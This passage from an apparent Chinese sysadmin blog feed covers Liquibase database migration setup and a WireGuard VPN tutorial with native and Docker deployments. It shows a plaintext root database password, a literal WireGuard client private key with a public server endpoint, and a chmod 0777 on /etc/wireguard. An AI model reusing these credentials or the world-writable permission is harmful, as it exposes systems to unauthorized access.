.bashrc<br></code></pre></td></tr></table></figure><h4 id="4-下载数据库驱动包"><a href="#4-下载数据库驱动包" class="headerlink" title="4.下载数据库驱动包"></a><strong>4.下载数据库驱动包</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local lib]# <span class="hljs-built_in">pwd</span><br>/opt/liquibase/lib<br><br>[root@node1.local lib]# wget https://downloads.mysql.com/archives/get/p/3/file/mysql-connector-j-8.0.33.tar.gz<br><br>解压<br>[root@node1.local lib]# tar xf mysql-connector-j-8.0.33.tar.gz <br>[root@node1.local lib]# <span class="hljs-built_in">mv</span> /opt/liquibase/lib/mysql-connector-j-8.0.33/mysql-connector-j-8.0.33.jar .<br></code></pre></td></tr></table></figure><h4 id="5-修改编码为UTF8"><a href="#5-修改编码为UTF8" class="headerlink" title="5.修改编码为UTF8"></a><strong>5.修改编码为UTF8</strong></h4><p>如果您在文件中使用的是UTF8编码，那么请务必在liquibase.bat文件中添加一行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local liquibase]# vim liquibase.bat<br>.....<br>IF NOT DEFINED JAVA_OPTS <span class="hljs-built_in">set</span> JAVA_OPTS=-Dfile.encoding=UTF–8<br></code></pre></td></tr></table></figure><h4 id="6-创建默认配置文件"><a href="#6-创建默认配置文件" class="headerlink" title="6.创建默认配置文件"></a><strong>6.创建默认配置文件</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local liquibase]# liquibase update<br><br>初始化配置文件<br>[root@node1.local liquibase]# liquibase init project<br><span class="hljs-comment">####################################################</span><br><span class="hljs-comment">##   _     _             _ _                      ##</span><br><span class="hljs-comment">##  | |   (_)           (_) |                     ##</span><br><span class="hljs-comment">##  | |    _  __ _ _   _ _| |__   __ _ ___  ___   ##</span><br><span class="hljs-comment">##  | |   | |/ _` | | | | | &#x27;_ \ / _` / __|/ _ \  ##</span><br><span class="hljs-comment">##  | |___| | (_| | |_| | | |_) | (_| \__ \  __/  ##</span><br><span class="hljs-comment">##  \_____/_|\__, |\__,_|_|_.__/ \__,_|___/\___|  ##</span><br><span class="hljs-comment">##              | |                               ##</span><br><span class="hljs-comment">##              |_|                               ##</span><br><span class="hljs-comment">##                                                ## </span><br><span class="hljs-comment">##  Get documentation at docs.liquibase.com       ##</span><br><span class="hljs-comment">##  Get certified courses at learn.liquibase.com  ## </span><br><span class="hljs-comment">##                                                ##</span><br><span class="hljs-comment">####################################################</span><br>Starting Liquibase at 13:22:40 using Java 1.8.0_431 (version 4.30.0 <span class="hljs-comment">#4943 built at 2024-10-31 17:00+0000)</span><br>Liquibase Version: 4.30.0<br>Liquibase Open Source 4.30.0 by Liquibase<br>Setup new liquibase.properties, flowfile, and sample changelog? Enter (Y)es with defaults, <span class="hljs-built_in">yes</span> with (C)ustomization, or (N)o. [Y]: <br>y<br>Setting up new Liquibase project <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;/opt/liquibase/.&#x27;</span>...<br><br>Created example changelog file <span class="hljs-string">&#x27;/opt/liquibase/example-changelog.sql&#x27;</span><br>Created example defaults file <span class="hljs-string">&#x27;/opt/liquibase/liquibase.properties&#x27;</span><br>Created example flow file <span class="hljs-string">&#x27;/opt/liquibase/liquibase.advanced.flowfile.yaml&#x27;</span><br>Created example flow file <span class="hljs-string">&#x27;/opt/liquibase/liquibase.flowvariables.yaml&#x27;</span><br>Created example flow file <span class="hljs-string">&#x27;/opt/liquibase/liquibase.endstage.flow&#x27;</span><br>Created example flow file <span class="hljs-string">&#x27;/opt/liquibase/liquibase.flowfile.yaml&#x27;</span><br>Created example checks package <span class="hljs-string">&#x27;/opt/liquibase/liquibase.checks-package.yaml&#x27;</span><br><br>To use the new project files make sure your database is active and accessible by opening a new terminal window to run <span class="hljs-string">&quot;liquibase init start-h2&quot;</span>, and <span class="hljs-keyword">then</span> <span class="hljs-built_in">return</span> to this terminal window to run <span class="hljs-string">&quot;liquibase update&quot;</span> <span class="hljs-built_in">command</span>.<br>For more details, visit the Getting Started Guide at https://docs.liquibase.com/start/home.html<br>Liquibase <span class="hljs-built_in">command</span> <span class="hljs-string">&#x27;init project&#x27;</span> was executed successfully.<br><br></code></pre></td></tr></table></figure><h4 id="7-编写change-log文件"><a href="#7-编写change-log文件" class="headerlink" title="7.编写change-log文件"></a><strong>7.编写change-log文件</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local changelog]# <span class="hljs-built_in">pwd</span><br>/opt/liquibase/changelog<br><br>[root@node1.local changelog]# vim master.yml <br>databaseChangeLog:<br>  - preConditions:<br>    - runningAs:<br>        username: cien66<br> <br>  - changeSet:<br>      <span class="hljs-built_in">id</span>: 1<br>      author: nvoxland<br>      changes:<br>        - createTable:<br>            tableName: person<br>            columns:<br>              - column:<br>                  name: <span class="hljs-built_in">id</span><br>                  <span class="hljs-built_in">type</span>: int<br>                  autoIncrement: <span class="hljs-literal">true</span><br>                  constraints:<br>                    primaryKey: <span class="hljs-literal">true</span><br>                    nullable: <span class="hljs-literal">false</span><br>              - column:<br>                  name: firstname<br>                  <span class="hljs-built_in">type</span>: varchar(50)<br>              - column:<br>                  name: lastname<br>                  <span class="hljs-built_in">type</span>: varchar(50)<br>                  constraints:<br>                    nullable: <span class="hljs-literal">false</span><br>              - column:<br>                  name: state<br>                  <span class="hljs-built_in">type</span>: char(2)<br> <br>  - changeSet:<br>      <span class="hljs-built_in">id</span>: 2<br>      author: nvoxland<br>      changes:<br>        - addColumn:<br>            tableName: person<br>            columns:<br>              - column:<br>                  name: username<br>                  <span class="hljs-built_in">type</span>: varchar(8)<br> <br>  - changeSet:<br>      <span class="hljs-built_in">id</span>: 3<br>      author: nvoxland<br>      changes:<br>        - addLookupTable:<br>            existingTableName: person<br>            existingColumnName: state<br>            newTableName: state<br>            newColumnName: <span class="hljs-built_in">id</span><br>            newColumnDataType: char(2)<br></code></pre></td></tr></table></figure><h4 id="8-编写数据库连接配置文件"><a href="#8-编写数据库连接配置文件" class="headerlink" title="8.编写数据库连接配置文件"></a><strong>8.编写数据库连接配置文件</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local changelog]# vim liquibase.properties<br>changeLogFile=master.yml<br><br><span class="hljs-comment">#### Enter the Target database &#x27;url&#x27; information  ####</span><br><span class="hljs-comment">#数据库地址</span><br>liquibase.command.url=jdbc:mysql://10.0.0.250:3306/zabbix<br><br><span class="hljs-comment"># Enter the username for your Target database.</span><br><span class="hljs-comment">#数据库用户名</span><br>liquibase.command.username: root<br><br><span class="hljs-comment"># Enter the password for your Target database.</span><br><span class="hljs-comment">#数据库密码</span><br>liquibase.command.password: IteSZOs#Em]uKUGEd4NRaR+OfD<br><br></code></pre></td></tr></table></figure><h2 id="三、liquibase使用"><a href="#三、liquibase使用" class="headerlink" title="三、liquibase使用"></a>三、liquibase使用</h2><p>参考文档：<a href="https://www.cnblogs.com/sanri1993/p/12125280.html">https://www.cnblogs.com/sanri1993/p/12125280.html</a></p><h4 id="1-更新"><a href="#1-更新" class="headerlink" title="1.更新"></a><strong>1.更新</strong></h4><p>基于liquibase.properties属性里面定义的changeLogFile文件来更新、修改数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local changelog]# liquibase update<br></code></pre></td></tr></table></figure><h4 id="2-设置标签，方便回滚"><a href="#2-设置标签，方便回滚" class="headerlink" title="2.设置标签，方便回滚"></a><strong>2.设置标签，方便回滚</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local changelog]# liquibase tag v2<br></code></pre></td></tr></table></figure><h4 id="3-回滚"><a href="#3-回滚" class="headerlink" title="3.回滚"></a><strong>3.回滚</strong></h4><p>指定changeLogFile文件操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 按照 changeSet 次数回滚</span><br>liquibase  --changeLogFile=<span class="hljs-string">&quot;sqls/changeLogFiledevtest.postgresql.sql&quot;</span> rollbackCount 1<br><br><span class="hljs-comment"># 按照标签回滚</span><br>liquibase  --changeLogFile=<span class="hljs-string">&quot;sqls/changeLogFiledevtest.postgresql.sql&quot;</span> rollback v1.0<br></code></pre></td></tr></table></figure><h4 id="4-使用差异升级源库"><a href="#4-使用差异升级源库" class="headerlink" title="4.使用差异升级源库"></a><strong>4.使用差异升级源库</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">liquibase --changeLogFile=<span class="hljs-string">&quot;sqls/changeLogFiledevtest.postgresql.sql&quot;</span> update<br></code></pre></td></tr></table></figure><h4 id="5-生成数据库脚本-新环境"><a href="#5-生成数据库脚本-新环境" class="headerlink" title="5.生成数据库脚本(新环境)"></a><strong>5.生成数据库脚本(新环境)</strong></h4><p>它会在你的目标数据库生成一张表 <code>DATABASECHANGELOG</code> 来管理版本 ，另一个 lock 的是防止多人同时操作数据库加的锁</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">liquibase --changeLogFile=<span class="hljs-string">&quot;sqls/create_table.mysql.sql&quot;</span>  generateChangeLog<br></code></pre></td></tr></table></figure><h4 id="6-查看历史标签"><a href="#6-查看历史标签" class="headerlink" title="6.查看历史标签"></a><strong>6.查看历史标签</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local changelog]# liquibase <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux中间件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WireGuard实现异地组网</title>
    <link href="/2025/04/15/WireGuard%E5%AE%9E%E7%8E%B0%E5%BC%82%E5%9C%B0%E7%BB%84%E7%BD%91/"/>
    <url>/2025/04/15/WireGuard%E5%AE%9E%E7%8E%B0%E5%BC%82%E5%9C%B0%E7%BB%84%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<p> WireGuard是一个易于配置、快速、安全的基于UDP协议的开源VPN软件。Wireguard具有自定义配置路由转发的能力，所以可以被用来在多个不同地域将设备所在的内网网络通过路由转发的方式串通起来，组建一张属于自己的大内网！有时候，我们想将本地计算机上提供的服务与小伙伴分享，但是我们既没有公网IP，又希望能够有足够的安全性，避免使其暴露在公网上。因此，我们基于Wireguard这一项最基本的特性，设计和实现了一套异地组网方案。我们基于Wireguard这一项最基本的特性，设计和实现了一套异地组网方案。这里给大家介绍两种部署方式，以供大家选择。</p><h2 id="一、WireGuard-基本概念"><a href="#一、WireGuard-基本概念" class="headerlink" title="一、WireGuard 基本概念"></a>一、WireGuard 基本概念</h2><p>首先使用 WireGuard 你需要在<a href="https://www.moyann.com/tag/%E7%B3%BB%E7%BB%9F/">系统</a>中创建一块虚拟网卡，并配置好这个虚拟网卡的 IP <a href="https://www.moyann.com/tag/%E5%9C%B0%E5%9D%80/">地址</a>，掩码，网关不需要配置（可以使用 wg-quick@ 自动化）</p><p>然后你使用 WireGuard <a href="https://www.moyann.com/tag/%E8%BF%9E%E6%8E%A5/">连接</a>另一台设备，两台互相 peer 对方并验证各自的公钥私钥是否正确，全部正确后成功建立 peer（可以使用 wg-quick@ 自动化）</p><p>建立成功后，所有前往虚拟网卡的<a href="https://www.moyann.com/tag/%E6%B5%81%E9%87%8F/">流量</a>都将被重新封装后发往另一台设备，由另一台设备解封装然后得到数据报文并在内部查找路由并匹配报文目的地。（可以使用 wg-quick@ 自动化）</p><p>以上为建立一个 WireGuard VPN 链接的过程，建立好后，A 设备与 B 设备互相需要保证虚拟网卡的 IP 在相同网络位的地址段中，并且这个地址段被 WireGuard 的配置<a href="https://www.moyann.com/tag/%E6%96%87%E4%BB%B6/">文件</a> AllowedIPs 所允许通过</p><p>如果你试图从 A 设备访问 B 设备的对端子网，你需要在 A 设备上配置系统路由，将系统三层网络的路由目的地指向对端虚拟 IP 地址，出接口为虚拟网卡，并且这个地址段必须被 WireGuard 的配置文件 AllowedIPs 所允许通过</p><p>最后，在 WireGuard 中的所有数据报文，都采用 UDP 的方式发送。</p><h2 id="二、安装-WireGuard"><a href="#二、安装-WireGuard" class="headerlink" title="二、安装 WireGuard"></a>二、安装 WireGuard</h2><p>1.安装Wireguard</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#root权限</span><br><span class="hljs-built_in">sudo</span> -i<br><br><span class="hljs-comment">#安装wireguard软件</span><br>apt install wireguard resolvconf -y<br><br><span class="hljs-comment">#开启IP转发</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt;&gt; /etc/sysctl.conf<br>sysctl -p<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>2.修改目录权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/wireguard/<br><span class="hljs-built_in">chmod</span> 0777 /etc/wireguard<br><br><span class="hljs-comment">#调整目录默认权限</span><br><span class="hljs-built_in">umask</span> 077<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>3.生成服务器密钥</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta">#生成私钥</span><br>wg genkey &gt; <span class="hljs-keyword">server</span>.key<br><br><span class="hljs-meta">#通过私钥生成公钥</span><br>wg pubkey &lt; <span class="hljs-keyword">server</span>.key &gt; <span class="hljs-keyword">server</span>.key.pub<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>4.生成客户端密钥</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment">#生成私钥</span><br>wg genkey &gt; client1.key<br><br><span class="hljs-comment">#通过私钥生成公钥</span><br>wg pubkey <span class="hljs-variable">&lt; client1.key &gt;</span> client1.key.pub<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>5.查看密钥</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">cat server.<span class="hljs-keyword">key</span> <span class="hljs-variable">&amp;&amp;</span> cat server.<span class="hljs-keyword">key</span>.pub <span class="hljs-variable">&amp;&amp;</span> cat client1.<span class="hljs-keyword">key</span> <span class="hljs-variable">&amp;&amp;</span> cat client1.<span class="hljs-keyword">key</span>.pub<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>6.创建服务端配置文件</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">echo <span class="hljs-string">&quot;</span><br>[Interface]<br>PrivateKey <span class="hljs-punctuation">=</span> $<span class="hljs-punctuation">(</span>cat server.key<span class="hljs-punctuation">)</span> <span class="hljs-meta"># 填写本机的privatekey 内容</span><br>Address <span class="hljs-punctuation">=</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">8.1</span> <span class="hljs-meta">#本机虚拟局域网IP</span><br><br>PostUp   <span class="hljs-punctuation">=</span> iptables <span class="hljs-punctuation">-</span>A FORWARD <span class="hljs-punctuation">-</span>i wg0 <span class="hljs-punctuation">-</span>j ACCEPT<span class="hljs-punctuation">;</span> iptables <span class="hljs-punctuation">-</span>A FORWARD <span class="hljs-punctuation">-</span>o wg0 <span class="hljs-punctuation">-</span>j ACCEPT<span class="hljs-punctuation">;</span> iptables <span class="hljs-punctuation">-</span>t nat <span class="hljs-punctuation">-</span>A POSTROUTING <span class="hljs-punctuation">-</span>o eth0 <span class="hljs-punctuation">-</span>j MASQUERADE<br>PostDown <span class="hljs-punctuation">=</span> iptables <span class="hljs-punctuation">-</span>D FORWARD <span class="hljs-punctuation">-</span>i wg0 <span class="hljs-punctuation">-</span>j ACCEPT<span class="hljs-punctuation">;</span> iptables <span class="hljs-punctuation">-</span>D FORWARD <span class="hljs-punctuation">-</span>o wg0 <span class="hljs-punctuation">-</span>j ACCEPT<span class="hljs-punctuation">;</span> iptables <span class="hljs-punctuation">-</span>t nat <span class="hljs-punctuation">-</span>D POSTROUTING <span class="hljs-punctuation">-</span>o eth0 <span class="hljs-punctuation">-</span>j MASQUERADE<br><span class="hljs-meta">#注意eth0需要为本机网卡名称</span><br><br>ListenPort <span class="hljs-punctuation">=</span> <span class="hljs-number">50814</span> <span class="hljs-meta"># 监听端口</span><br>DNS <span class="hljs-punctuation">=</span> <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span><br>MTU <span class="hljs-punctuation">=</span> <span class="hljs-number">1420</span><br>[Peer]<br>PublicKey <span class="hljs-punctuation">=</span>  $<span class="hljs-punctuation">(</span>cat client1.key.pub<span class="hljs-punctuation">)</span>  <span class="hljs-meta">#自动client1的公钥</span><br>AllowedIPs <span class="hljs-punctuation">=</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">8.10</span>/<span class="hljs-number">32</span> <span class="hljs-meta">#客户端所使用的IP&quot; &gt; wg0.conf</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>7.启动服务</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#设置开机自启动</span><br>systemctl enable wg-quick<span class="hljs-variable">@wg0</span><br><br><span class="hljs-comment">#启动wg0</span><br>wg-quick up wg0<br><br><span class="hljs-comment">#关闭wg0</span><br>wg-quick down wg0<br><br><span class="hljs-comment">#如果启动失败只有有wg0网卡，需删除再次启动</span><br>ip <span class="hljs-keyword">link</span> <span class="hljs-keyword">delete</span> wg0<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>8.配置客户端</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Windows下载地址：https://www.wireguard.com/install/</span><br><br><span class="hljs-comment">#客户端配置</span><br>[Interface]<br>PrivateKey = 6M8HEZioew+vR3i53sPc64Vg40YsuMzh4vI1Lkc88Xo= <span class="hljs-comment">#此处为client1的私钥</span><br>Address = 10.0.8.10 <span class="hljs-comment">#此处为peer规定的客户端IP</span><br>MTU = 1500<br><br>[Peer]<br>PublicKey = Tt5WEa0Vycf4F+TTjR2TAHDfa2onhh+tY8YOIT3cKjI= <span class="hljs-comment">#此处为server的公钥</span><br>AllowedIPs = 10.0.8.0/24 <span class="hljs-comment">#此处为允许的服务器IP</span><br>Endpoint = 114.132.56.178:50814 <span class="hljs-comment">#服务器对端IP+端口</span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>9.连接</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4658e56cf5dc493194931b981480e24a.png" alt="4658e56cf5dc493194931b981480e24a.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑这时候很明显我电脑和服务器地址不在一个网段，但是我也可以成功访问公司网络咯~</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/09870e03be6c457aaca5f71da26dc80c.png" alt="09870e03be6c457aaca5f71da26dc80c.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><h2 id="三、docker部署"><a href="#三、docker部署" class="headerlink" title="三、docker部署"></a>三、docker部署</h2><p>这种方式简单，前提是需要安装docker。关于docker部署，cicd专栏-kubeadm部署k8s一篇博文中有写到。感兴趣小伙伴可以参考</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --name=wg-easy <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_HOST=<span class="hljs-number">123.123.123.123</span> (🚨这里输入服务器的公网IP) <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e PASSWORD=passwd123 (🚨这里输入你的密码) <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_DEFAULT_ADDRESS=<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>.x （🚨默认IP地址）<span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_DEFAULT_DNS=<span class="hljs-number">114.114.114.114</span> （🚨默认DNS）<span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_ALLOWED_IPS=<span class="hljs-number">10.0.8.0</span>/<span class="hljs-number">24</span> （🚨允许连接的IP段）<span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e WG_PERSISTENT_KEEPALIVE=<span class="hljs-number">25</span> （🚨重连间隔）<span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -v ~/.wg-easy:/etc/wireguard <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">51820</span>:<span class="hljs-number">51820</span>/udp <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">51821</span>:<span class="hljs-number">51821</span>/tcp <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --cap-add=NET_ADMIN <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --cap-add=SYS_MODULE <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --sysctl=<span class="hljs-string">&quot;net.ipv4.conf.all.src_valid_mark=1&quot;</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --sysctl=<span class="hljs-string">&quot;net.ipv4.ip_forward=1&quot;</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --restart unless-stopped <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  weejewel/wg-easy<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>容器更新命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker stop wg-easy<br>docker <span class="hljs-built_in">rm</span> wg-easy<br>docker pull weejewel/wg-easy<br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux中间件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mailu自建邮件服务</title>
    <link href="/2025/04/15/mailu%E8%87%AA%E5%BB%BA%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/"/>
    <url>/2025/04/15/mailu%E8%87%AA%E5%BB%BA%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/</url>
    
